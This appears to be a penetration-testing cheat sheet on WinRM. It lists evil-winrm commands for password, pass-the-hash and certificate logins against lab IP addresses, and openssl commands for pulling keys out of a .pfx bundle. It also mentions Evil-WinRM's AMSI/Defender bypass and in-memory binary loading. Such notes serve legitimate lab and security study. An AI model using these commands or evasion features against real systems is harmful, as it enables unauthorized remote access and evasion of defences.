## Windows Remote Management

WinRM is a Microsoft implementation of the DMTF Sandard WS-Management Standard. A SOAP based protocol used to administer devices.


Winrm uses kerberos authentication by default but it can be expanded with SSL/TLS Certificates.



Evil-Winrm Basic:

```bash
# User/pass
evil-winrm -u MercerH -p CoolPasswd -i 10.200.70.117
# pth
evil-winrm -u MercerH -H 5edc955e8167199d1b7d0e656da0ceea -i 10.200.70.117 
# Certificate Auth (AD CA)
evil-winrm -S -i 10.129.227.105 -u Legacyy -p thuglegacy -c tlapse.cer -k tlapse.key 


# Specify PS Scripts folder
proxychains4 evil-winrm -i 10.200.101.150 -u kek -p 'kek123!' -s ~/TransferKit 

# Then load them with


```
**Check out always the documentation**


Evil-WinRM has a lot of interesting features. One of with is an AMSI (common detection) bypass allowing to run some powershell scripts on a target with windows defender.  `Bypass-4MSI`

It's also possible to load binaries directly in memory, it's handy in some cases but it doesn't really a lot of obfuscation to the malware.  `Invoke-Binary`



### WinRM Certificate login
Uses the Active Directory Certificate Authority

The certificate file(s) have different extentions and purposes:

| Extention |   Meaning     |
|---------- |:-------------|
| file.pfx  |  PKCS#12 Bundle, contains both private and public keys|   |
| file.key  |Private Key File |
| file.cer  | Public Key File |

Evil-WinRM uses the ".key" and ".cer" extentions

**Extract keys from pfx file**
[Great Article](http://www.freekb.net/Article?id=2460)

```bash
#Show infos
openssl pkcs12 -in example.pfx -passin pass:your_password -info
openssl pkcs12 -in example.pfx -passin pass:your_password -passout pass:your_password -info

#Extract Certs
openssl pkcs12 -in legacyy_dev_auth.pfx  -passin pass:thuglegacy -passout pass:thuglegacy -info -clcerts 2>/dev/null

#PrivKey --> -----BEGIN/END ENCRYPTED PRIVATE KEY-----
#PubKey  --> -----BEGIN/END CERTIFICATE-----


```